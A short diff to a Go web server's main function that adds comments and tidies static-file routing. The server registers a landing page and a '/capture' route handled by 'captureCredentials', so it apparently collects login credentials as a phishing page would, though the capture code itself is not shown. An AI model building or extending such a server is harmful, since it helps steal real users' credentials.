@@ -13,13 +13,11 @@ type Credentials struct {
 }
 
 func main() {
-	http.HandleFunc("/", serveLandingPage)
+	http.HandleFunc("/", serveLandingPage) // Serve the landing page
 	http.HandleFunc("/capture", captureCredentials)
 
-	// fs := http.FileServer(http.Dir("./public"))
-	// http.Handle("/static/", http.StripPrefix("/static/", fs))
+	// Serve static files (images, CSS, JS, etc.) from the 'public' directory
 	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./public"))))
-	http.Handle("/", http.FileServer(http.Dir("./public"))) // Serves index.html
 
 	fmt.Println("Server running at http://localhost:8080")
 	log.Fatal(http.ListenAndServe(":8080", nil))
